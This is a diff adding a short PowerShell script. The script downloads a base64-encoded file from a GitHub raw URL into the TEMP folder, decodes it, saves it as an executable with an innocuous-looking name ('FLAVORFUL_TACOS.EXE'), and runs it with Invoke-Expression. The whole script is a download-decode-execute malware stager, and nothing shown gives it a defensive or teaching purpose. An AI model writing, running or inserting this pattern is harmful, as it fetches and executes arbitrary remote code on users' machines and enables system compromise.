@@ -1,0 +1,18 @@
+# Specify the paths
+$encodedFileURL = "https://raw.githubusercontent.com/shonen787/crypto/main/file"
+$inputPath = "$env:TEMP\temperature.txt"
+$decodedFilePath = "$env:TEMP\FLAVORFUL_TACOS.EXE"
+
+$client = New-Object System.Net.WebClient
+$client.DownloadFile($encodedFileURL,$inputPath);
+
+$content = [IO.File]::ReadAllText("$inputPath");
+
+
+# Decode the content
+$decodedContent = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($content))
+
+# Save the decoded content to a new file in the temp folder
+$decodedContent | Out-File -FilePath $decodedFilePath
+
+Invoke-Expression -Command $decodedFilePath
